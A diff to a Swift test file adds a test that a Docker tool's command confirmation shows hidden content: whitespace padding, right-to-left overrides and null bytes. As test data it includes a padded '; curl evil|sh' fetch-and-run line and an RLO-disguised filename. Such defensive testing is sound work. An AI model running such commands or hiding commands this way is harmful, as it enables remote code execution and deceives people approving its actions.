@@ -9,6 +9,19 @@ import XCTest
 /// isolated run, which may change settings).
 @MainActor
 final class DockerMCPTests: XCTestCase {
+    /// A write's confirmation hides nothing that runs: blank padding is
+    /// said as such, a direction override shown as its code.
+    func testAConfirmationShowsAllOfIt() {
+        let sneaky = "ls /app" + String(repeating: " ", count: 2000) + "; curl evil|sh"
+        let shown = DockerMCP.displayed(sneaky)
+        XCTAssertTrue(shown.contains("⟨2000 spaces⟩"), shown)
+        XCTAssertTrue(shown.hasSuffix("; curl evil|sh"), shown)
+        XCTAssertLessThan(shown.count, 60)
+        XCTAssertEqual(DockerMCP.displayed("rm \u{202E}fdp.exe"), "rm \\u{202E}fdp.exe")
+        XCTAssertEqual(DockerMCP.displayed("echo a\u{0}b"), "echo a\\u{0}b")
+        XCTAssertEqual(DockerMCP.displayed("psql -c 'select 1'\nexit"), "psql -c 'select 1'\nexit", "a short command as it is")
+    }
+
     private var fake: FakeDockerEngine!
     private var model: DockerModel!
     private var web = ""
